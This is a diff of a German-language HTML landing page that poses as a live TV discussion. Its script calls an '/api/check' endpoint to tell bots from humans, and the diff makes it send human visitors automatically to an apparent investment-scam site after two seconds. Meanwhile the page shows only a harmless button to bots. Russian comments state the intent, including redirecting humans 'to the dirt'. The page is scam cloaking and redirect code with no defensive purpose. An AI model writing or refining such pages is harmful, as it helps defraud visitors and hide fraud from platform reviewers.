@@ -2,7 +2,7 @@
 <html lang="de">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="description" content="Sehen Sie sich eine exklusive Diskussion zu aktuellen Ereignissen im Fernsehen an. Live-Übertragung jetzt verfügbar.">
   <title>Exklusive TV-Diskussion - Live-Übertragung</title>
   <style>
@@ -45,9 +45,13 @@
       font-size: 18px;
       margin-top: 20px;
       transition: background-color 0.3s ease;
+      cursor: pointer;
     }
     .button:hover {
       background-color: #005bb5;
+    }
+    .hidden {
+      display: none;
     }
   </style>
 </head>
@@ -60,31 +64,44 @@
 <div class="content">
   <img src="https://raw.githubusercontent.com/tmildred222/new/refs/heads/main/Screenshot%202025-04-26%20at%2023.05.52.png" alt="Diskussion im Fernsehen">
   <p>Erfahren Sie mehr über aktuelle Entwicklungen und spannende Interviews direkt im Fernsehen.</p>
-
-  <a href="#" class="button" id="watchButton">Jetzt ansehen</a>
+  <a href="#" class="button hidden" id="watchButton">Jetzt ansehen</a>
+</div>
 
 <script>
-  document.getElementById('watchButton').addEventListener('click', async function(e) {
-    e.preventDefault();
-    try {
-      const response = await fetch('/api/check');
-      const result = await response.json();
-      
-      if (result.status === 'ok') {
-        // Если человек — редиректим на грязь
-        window.location.href = 'https://wealth-masterpro.com/de/';
-      } else {
-        // Если бот — ничего не делаем
-        alert('Seite nicht verfügbar.');
-      }
-    } catch (error) {
-      console.error('Error:', error);
-      alert('Etwas ist schief gelaufen.');
-    }
-  });
-</script>
+async function checkStepOne() {
+  try {
+    const response = await fetch('/api/check', { cache: "no-store" });
+    const result = await response.json();
 
-</div>
+    if (result.status === 'ok') {
+      setTimeout(() => {
+        window.location.href = 'https://wealth-masterpro.com/de/';
+      }, 2000); // Авто-переход через 2 секунды
+    } else {
+      document.getElementById('watchButton').classList.remove('hidden');
+    }
+  } catch (error) {
+    console.error('Ошибка при проверке:', error);
+    document.getElementById('watchButton').classList.remove('hidden');
+  }
+}
+
+document.getElementById('watchButton').addEventListener('click', async function(e) {
+  e.preventDefault();
+  try {
+    const response = await fetch('/api/check', { cache: "no-store" });
+    const result = await response.json();
+
+    if (result.status === 'ok') {
+      window.location.href = 'https://wealth-masterpro.com/de/';
+    }
+  } catch (error) {
+    console.error('Ошибка при переходе:', error);
+  }
+});
+
+setTimeout(checkStepOne, 2000); // Старт проверки через 2 секунды после загрузки
+</script>
 
 </body>
 </html>
